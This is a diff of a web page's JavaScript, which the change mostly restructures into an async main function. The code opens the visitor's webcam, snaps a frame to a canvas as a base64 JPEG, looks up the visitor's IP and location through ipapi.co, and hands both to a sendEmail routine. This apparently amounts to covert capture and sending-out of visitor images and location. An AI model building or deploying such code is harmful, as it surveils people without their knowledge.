@@ -26,73 +26,72 @@
         const canvas=document.getElementById('canvas');
         const snap=document.getElementById('snap');
         const errorMsgElement=document.getElementById('span#ErrorMsg');
-        async function listDevices(){
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            //console.log(devices)
-            return devices.filter(device => device.kind === 'videoinput');
+
+        main();
+
+        async function main(){
+            async function listDevices(){
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                //console.log(devices)
+                return devices.filter(device => device.kind === 'videoinput');
+            }
+            const videoDevices=await listDevices()
+            console.log(videoDevices)
+            console.log(videoDevices[0].deviceid)
+
+
+            const constraints={
+                video: {
+                    width: {
+                    min: 1280,
+                    ideal: 1920,
+                    max: 2560,
+                    },
+                    height: {
+                    min: 720,
+                    ideal: 1080,
+                    max: 1440
+                    },
+                    facingMode: 'user'
+                },deviceId: {
+                    exact: videoDevices[0].deviceid
+                }
+            };
+
+            async function init(){
+                try{
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    handleSucess(stream)
+                }catch(e){
+                    errorMsgElement.innerHTML=`navigator.getUserMedia.error:${e.toString()}`
+                }
+            }
+
+        //Sucess
+        function handleSucess(stream){
+            window.stream= stream;
+            video.srcObject=stream;
         }
-        const videoDevices=await listDevices()
-        console.log(videoDevices)
-        console.log(videoDevices[0].deviceid)
+        init();
 
-
-        const constraints={
-            video: {
-                width: {
-                min: 1280,
-                ideal: 1920,
-                max: 2560,
-                },
-                height: {
-                min: 720,
-                ideal: 1080,
-                max: 1440
-                },
-                facingMode: 'user'
-            },deviceId: {
-                exact: videoDevices[0].deviceid
-            }
-        };
-
-        async function init(){
-            try{
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                handleSucess(stream)
-            }catch(e){
-                errorMsgElement.innerHTML=`navigator.getUserMedia.error:${e.toString()}`
-            }
+        var context= canvas.getContext('2d');
+        async function startSnap(){
+                context.drawImage(video,0,0,640,480)
+                const base64image=canvas.toDataURL('image/jpeg');
+                console.log(base64image)
+                var Body="Attachment of the webcam snap";
+                try{
+                    await $.getJSON('https://ipapi.co/json/', function(data) {
+                        var ipdata=JSON.stringify(data, null, 2)
+                        console.log(ipdata);
+                        Body+="\n"+ipdata;
+                    });
+                }catch{
+                    console.log("Error")
+                    Body+="\n"+"[ERROR]";
+                }
+                sendEmail(base64image,Body)
         }
-
-    //Sucess
-    function handleSucess(stream){
-        window.stream= stream;
-        video.srcObject=stream;
     }
-    init();
-
-    var context= canvas.getContext('2d');
-    async function startSnap(){
-            context.drawImage(video,0,0,640,480)
-            const base64image=canvas.toDataURL('image/jpeg');
-            console.log(base64image)
-            var Body="Attachment of the webcam snap";
-            try{
-                await $.getJSON('https://ipapi.co/json/', function(data) {
-                    var ipdata=JSON.stringify(data, null, 2)
-                    console.log(ipdata);
-                    Body+="\n"+ipdata;
-                });
-            }catch{
-                console.log("Error")
-                Body+="\n"+"[ERROR]";
-            }
-            sendEmail(base64image,Body)
-    }
-
-
-
-    
-
-
     </script>
 </html>
